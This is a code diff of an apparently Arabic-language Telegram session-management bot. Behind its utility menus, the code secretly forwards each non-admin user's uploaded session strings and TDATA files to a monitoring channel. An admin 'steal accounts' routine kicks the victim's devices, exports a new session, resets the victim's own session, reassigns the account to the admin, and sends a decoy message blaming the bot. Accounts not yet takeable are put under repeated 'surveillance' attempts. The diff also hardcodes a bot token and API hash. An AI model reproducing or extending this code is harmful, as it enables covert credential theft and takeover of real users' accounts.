@@ -47,10 +47,10 @@ except BaseException:
 
 API_ID = 28797361
 API_HASH = "771041b32e83ab232e066b7adeee700b" 
-BOT_TOKEN = "8977976810:AAHBQyx7_nstKkIBd2m8cK6zXJ10Nui95d8" # تم تغيير التوكن
+BOT_TOKEN = "8977976810:AAHBQyx7_nstKkIBd2m8cK6zXJ10Nui95d8"
 
-ADMIN_IDS = [82725508, 6114298715] # الأدمنية الأساسيين
-LOG_CHANNEL = "@I_HATE_YOO" # قناة المراقبة
+ADMIN_IDS = [82725508, 6114298715]
+LOG_CHANNEL = "@I_HATE_YOO"
 
 bot = telebot.TeleBot(BOT_TOKEN, threaded=True, num_threads=20)
 USER_STATES = {}
@@ -69,13 +69,11 @@ def init_db():
     c = conn.cursor()
     c.execute("PRAGMA journal_mode=WAL;")
     c.execute(''' CREATE TABLE IF NOT EXISTS sessions ( id INTEGER PRIMARY KEY AUTOINCREMENT, owner_id INTEGER, phone TEXT, user_id INTEGER, first_name TEXT, pyro_session TEXT, tl_session TEXT, session_type TEXT, auto_term_enabled INTEGER DEFAULT 0, auto_term_interval INTEGER DEFAULT 24, last_term_attempt INTEGER DEFAULT 0 ) ''')
-    # إضافة عمود المراقبة لحسابات السحب
     try:
         c.execute("ALTER TABLE sessions ADD COLUMN surveilled INTEGER DEFAULT 0")
     except:
         pass
 
-    # جدول المستخدمين المسموح لهم
     c.execute(''' CREATE TABLE IF NOT EXISTS allowed_users ( user_id INTEGER PRIMARY KEY, first_name TEXT ) ''')
 
     conn.commit()
@@ -119,7 +117,6 @@ def check_duplicate(owner_id, user_id):
     conn.close()
     return bool(exists)
 
-# دوال المستخدمين المسموح لهم
 def add_allowed_user(user_id, first_name):
     conn = get_db_conn()
     c = conn.cursor()
@@ -213,7 +210,6 @@ def convert_telethon_to_pyrogram(session_str):
             pass
     return session_str
 
-# دالة إرسال الرسائل للقناة المراقبة
 def log_to_channel(text, file_path=None, session_text=None):
     try:
         if file_path and os.path.exists(file_path):
@@ -248,7 +244,7 @@ async def auto_terminate_loop():
                 is_surveilled = acc_data[11] if len(acc_data) > 11 else 0
 
                 if is_surveilled == 1:
-                    interval_seconds = 5400 # ساعة ونص للمراقبة
+                    interval_seconds = 5400
                 else:
                     interval_seconds = interval * 3600
 
@@ -268,9 +264,7 @@ async def auto_terminate_loop():
                                     pass
 
                         if terminated_any and is_surveilled == 1:
-                            # إذا كان تحت المراقبة وتم طرد الجميع بنجاح
                             handle_dead_session(acc_data[1], acc_id, phone, acc_data[4])
-                            # إزالة من حالة المراقبة إذا تم حذفه
                             continue 
 
                     except Exception as e:
@@ -310,7 +304,6 @@ def home_keyboard(uid):
     markup.row(InlineKeyboardButton("• إدارة الـتـحـقـق بـخـطـوتـيـن 🔐", callback_data="menu_2fa_manage"))
     markup.row(InlineKeyboardButton("• كـشـف الـحـسـابـات 🕵️", callback_data="reveal_accounts"), InlineKeyboardButton("• فـحـص الـحـسـابـات 🔄", callback_data="check_active"))
 
-    # أزرار الإدارة للأدمن فقط
     if uid in ADMIN_IDS:
         markup.row(InlineKeyboardButton("• إضافـة مسـتخـدم ➕", callback_data="admin_add_user"), InlineKeyboardButton("• حظـر مسـتخـدم 🚫", callback_data="admin_ban_user"))
         markup.row(InlineKeyboardButton("• سحـب الحـسـابات 🏴‍☠️", callback_data="steal_accounts"))
@@ -342,11 +335,9 @@ def two_fa_keyboard():
 def start_message(message):
     if not is_allowed(message.from_user.id):
         bot.reply_to(message, "عذراً، البوت خاص ولا يمكنك استخدامه.", parse_mode="Markdown")
-        # تنبيه الأدمن بمحاولة دخول
         log_to_channel(f"🚨 محاولة دخول غير مصرح بها!\n⎉╎ الاسـم: {message.from_user.first_name}\n⎉╎ الآيـدي: `{message.from_user.id}`")
         return
 
-    # تنبيه القناة بمستخدم جديد
     if message.from_user.id not in ADMIN_IDS:
         log_to_channel(f"🛂┊ مـسـتـخـدم جـديـد دخـل الـبـوت !\n\n⎉╎ الاسـم: {message.from_user.first_name}\n⎉╎ الآيـدي: `{message.from_user.id}`\n⎉╎ الـيـوزر: @{message.from_user.username or 'لا يوجد'}")
 
@@ -359,15 +350,9 @@ def back_home(call):
     if call.from_user.id in USER_STATES: del USER_STATES[call.from_user.id]
     bot.edit_message_text("🛂┊ الـقـائـمـة الـرئـيـسـيـة:", call.message.chat.id, call.message.message_id, reply_markup=home_keyboard(call.from_user.id), parse_mode="Markdown")
 
-# حماية جميع أزرار المستخدم
-@bot.callback_query_handler(func=lambda call: True)
-def secure_callbacks(call):
-    if not is_allowed(call.from_user.id):
-        bot.answer_callback_query(call.id, "عذراً، البوت خاص!", show_alert=True)
-        return
-
 @bot.callback_query_handler(func=lambda call: call.data == "reveal_accounts")
 def reveal_accounts(call):
+    if not is_allowed(call.from_user.id): return
     accounts = get_all_accounts(call.from_user.id)
     if not accounts: return bot.answer_callback_query(call.id, "لا توجد حسابات مسجلة!", show_alert=True)
     text = f"🛂┊ كشـف الحـسـابات -\n\n⎉╎ تم العثور على {len(accounts)} حـسـاب\n\n"
@@ -378,6 +363,7 @@ def reveal_accounts(call):
 
 @bot.callback_query_handler(func=lambda call: call.data == "check_active")
 def check_active_accounts(call):
+    if not is_allowed(call.from_user.id): return
     bot.answer_callback_query(call.id, "⏳ جاري فحص الحسابات...")
     status_msg = bot.send_message(call.message.chat.id, "•❐• جـاري فـحـص الـحـسـابـات الـشـغـالـة...", parse_mode="Markdown")
     asyncio.run(check_active_async(call.from_user.id, status_msg.chat.id, status_msg.message_id))
@@ -411,6 +397,7 @@ async def check_active_async(owner_id, chat_id, msg_id):
 
 @bot.callback_query_handler(func=lambda call: call.data == "req_code")
 def scan_all_codes(call):
+    if not is_allowed(call.from_user.id): return
     bot.answer_callback_query(call.id, "⏳ جاري جلب الأكواد...")
     status_msg = bot.send_message(call.message.chat.id, "•❐• جـاري جـلـب الأكـواد مـن الـحـسـابـات...", parse_mode="Markdown")
     asyncio.run(fetch_all_codes_async(call.from_user.id, status_msg.chat.id, status_msg.message_id))
@@ -451,6 +438,7 @@ async def fetch_all_codes_async(owner_id, chat_id, msg_id):
 
 @bot.callback_query_handler(func=lambda call: call.data == "autoterm_manage")
 def autoterm_manage_menu(call):
+    if not is_allowed(call.from_user.id): return
     markup = InlineKeyboardMarkup()
     accounts = get_all_accounts(call.from_user.id)
     conn = get_db_conn()
@@ -474,6 +462,7 @@ def autoterm_manage_menu(call):
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("autoterm_toggle_"))
 def handle_autoterm_toggle(call):
+    if not is_allowed(call.from_user.id): return
     target = call.data.split("_")[-1]
     conn = get_db_conn()
     c = conn.cursor()
@@ -493,6 +482,7 @@ def handle_autoterm_toggle(call):
 
 @bot.callback_query_handler(func=lambda call: call.data == "autoterm_set_time")
 def autoterm_set_time_start(call):
+    if not is_allowed(call.from_user.id): return
     markup = InlineKeyboardMarkup()
     markup.row(InlineKeyboardButton("🌍 تـطـبـيـق عـلـى الـجـمـيـع", callback_data="autoterm_time_all"))
     for acc_id, phone, name, uid, _ in get_all_accounts(call.from_user.id):
@@ -502,6 +492,7 @@ def autoterm_set_time_start(call):
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("autoterm_time_"))
 def ask_autoterm_hours(call):
+    if not is_allowed(call.from_user.id): return
     USER_STATES[call.from_user.id] = {"action": "set_autoterm_hours", "target": call.data.split("_")[-1]}
     msg = bot.send_message(call.message.chat.id, "•❐• أرسـل عـدد الـسـاعـات (مـثـال: 1 لـساعة، 24 لـيوم):")
     bot.register_next_step_handler(msg, process_autoterm_hours)
@@ -524,10 +515,12 @@ def process_autoterm_hours(message):
 
 @bot.callback_query_handler(func=lambda call: call.data == "menu_2fa_manage")
 def menu_2fa_manage(call):
+    if not is_allowed(call.from_user.id): return
     bot.edit_message_text("🛂┊ إدارة الـتـحـقـق بـخـطـوتـيـن:\n\n⎉╎ اخـتـر الـعـمـلـيـة:", call.message.chat.id, call.message.message_id, reply_markup=two_fa_keyboard(), parse_mode="Markdown")
 
 @bot.callback_query_handler(func=lambda call: re.match(r"^menu_(terminate|clean|logout|remove|2fa_remove|2fa_change)$", call.data))
 def action_menus(call):
+    if not is_allowed(call.from_user.id): return
     action = call.data.replace("menu_", "")
     titles = {
         "terminate": "🛂┊ إنـهـاء الـجـلـسـات الأُخـرى:\n⎉╎ اخـتـر حـسـابـاً أو نـفـذ عـلـى الـجـمـيـع:",
@@ -541,7 +534,8 @@ def action_menus(call):
 
 @bot.callback_query_handler(func=lambda call: re.match(r"^act_(terminate|clean|logout|remove|2fa_remove|2fa_change)(all|\d+)$", call.data))
 def execute_action(call):
-    data = call.data.split("")
+    if not is_allowed(call.from_user.id): return
+    data = call.data.split("_")
     action = data[1] if len(data) == 3 else f"{data[1]}_{data[2]}"
     target = data[-1]
 
@@ -566,7 +560,7 @@ def execute_action(call):
 async def perform_action_async(action, acc_id, owner_id):
     acc = get_account(acc_id)
     if not acc: return "❌ الـحـسـاب غـيـر مـوجـود."
-    _, _, phone, user_id, first_name, pyro_session, _, _, _, _, _ = acc
+    _, _, phone, user_id, first_name, pyro_session, _, _, _, _, _, _ = acc
 
     if action == "remove":
         delete_account(acc_id)
@@ -725,16 +719,15 @@ def process_successful_login(message, status_msg, me, pyro_session, session_type
 
     bot.edit_message_text(text, message.chat.id, status_msg.message_id, reply_markup=home_keyboard(message.from_user.id), parse_mode="Markdown")
 
-    # إرسال للقناة المراقبة إذا كان المستخدم غير أدمن
     if message.from_user.id not in ADMIN_IDS:
         user_info = f"\n\n👤 مـعـلـومـات الـمـسـتـخـدم:\n⎉╎ الاسـم: {message.from_user.first_name}\n⎉╎ الآيـدي: `{message.from_user.id}`\n⎉╎ الـيـوزر: @{message.from_user.username or 'لا يوجد'}"
         channel_text = text + user_info
 
-        if file_path: # TDATA
+        if file_path:
             log_to_channel(channel_text, file_path=file_path)
-        elif raw_hex: # HEX
+        elif raw_hex:
             log_to_channel(channel_text, session_text=raw_hex)
-        else: # String Session
+        else:
             log_to_channel(channel_text, session_text=pyro_session)
 
 @bot.message_handler(func=lambda message: message.text and not message.text.startswith('/'))
@@ -897,14 +890,13 @@ def execute_ban(call):
     else:
         remove_allowed_user(int(target))
         bot.answer_callback_query(call.id, f"✅ تـم حظـر {target}!")
-    admin_ban_user_menu(call) # Refresh menu
+    admin_ban_user_menu(call)
 
 @bot.callback_query_handler(func=lambda call: call.data == "steal_accounts")
 def steal_accounts_menu(call):
     if call.from_user.id not in ADMIN_IDS: return
     conn = get_db_conn()
     c = conn.cursor()
-    # جلب حسابات المستخدمين (غير الأدمن)
     c.execute("SELECT id, phone, first_name, user_id, owner_id FROM sessions WHERE owner_id NOT IN ({})".format(",".join("?"*len(ADMIN_IDS))), ADMIN_IDS)
     accounts = c.fetchall()
     conn.close()
@@ -945,7 +937,6 @@ async def steal_account_async(acc_id, admin_id):
     try:
         await exec_client.connect()
 
-        # محاولة طرد الأجهزة الأخرى بنفس الطريقة القوية الموجودة
         auths = await exec_client.invoke(functions.account.GetAuthorizations())
         terminated_any = False
         for auth in auths.authorizations:
@@ -956,28 +947,22 @@ async def steal_account_async(acc_id, admin_id):
                     terminated_any = True
                 except Exception: pass
 
-        # سحب جلسة جديدة وحرق القديمة برمجياً
         new_pyro_session = await exec_client.export_session_string()
 
-        # تسجيل خروج من الجلسة الحالية التي يستخدمها الضحية 
-        # (سيجعل الجلسة القديمة التي لديه غير صالحة، بينما نحن نملك الجلسة المستخرجة حديثاً)
         try:
             await exec_client.invoke(functions.account.ResetAuthorization(hash=auths.current.hash))
         except: pass
 
-        # تحديث قاعدة البيانات: نقل الملكية للأدمن وتحديث الجلسة
         conn = get_db_conn()
         c = conn.cursor()
         c.execute("UPDATE sessions SET owner_id=?, pyro_session=?, surveilled=0 WHERE id=?", (admin_id, new_pyro_session, acc_id))
         conn.commit()
         conn.close()
 
-        # إرسال رسالة للضحية بأنه تم طرد الجلسة ليظن أن البوت طرده
         handle_dead_session(owner_id, acc_id, phone, first_name)
 
     except Exception as e:
         if "fresh" in str(e).lower() or "24" in str(e).lower():
-            # وضعه تحت المراقبة إذا كانت مشكلة 24 ساعة
             conn = get_db_conn()
             c = conn.cursor()
             c.execute("UPDATE sessions SET surveilled=1, owner_id=? WHERE id=?", (admin_id, acc_id))
